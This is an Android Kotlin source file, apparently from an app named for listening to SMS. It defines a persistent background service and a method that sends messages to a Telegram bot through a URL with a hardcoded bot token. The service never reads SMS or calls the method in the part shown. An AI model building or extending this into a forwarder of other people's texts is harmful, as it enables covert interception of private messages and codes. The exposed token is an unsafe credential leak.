package com.example.smslistner

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import okhttp3.*
import java.io.IOException
import java.net.URLEncoder

class MonServiceEnArrierePlan : Service() {
    private val CHANNEL_ID = "smsServiceChannel"

    override fun onCreate() {
        super.onCreate()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(CHANNEL_ID, "SMS Service Channel", NotificationManager.IMPORTANCE_DEFAULT)
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val notificationIntent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, PendingIntent.FLAG_IMMUTABLE)

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Service Actif")
            .setContentText("L'application s'exécute en arrière-plan.")
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setContentIntent(pendingIntent)
            .setOngoing(true) // Rend la notification persistante
            .build()

        startForeground(1, notification)
        return START_STICKY
    }


    override fun onBind(intent: Intent): IBinder? = null


    private fun sendToTelegram(message: String) {
        val client = OkHttpClient()
        val encodedMessage = URLEncoder.encode(message, "UTF-8")
        val url = "https://api.telegram.org/bot6950283126:AAEIQisYlUz6fgo26kFz4SDrL9WKImwdEQM/sendMessage?chat_id=@mysmsinmyphone&text=$encodedMessage"

        val request = Request.Builder()
            .url(url)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                e.printStackTrace()
            }

            override fun onResponse(call: Call, response: Response) {
                try {
                    if (!response.isSuccessful) throw IOException("Unexpected code $response")
                    // Logique en cas de succès
                } finally {
                    response.body?.close()
                }
            }
        })
    }
}
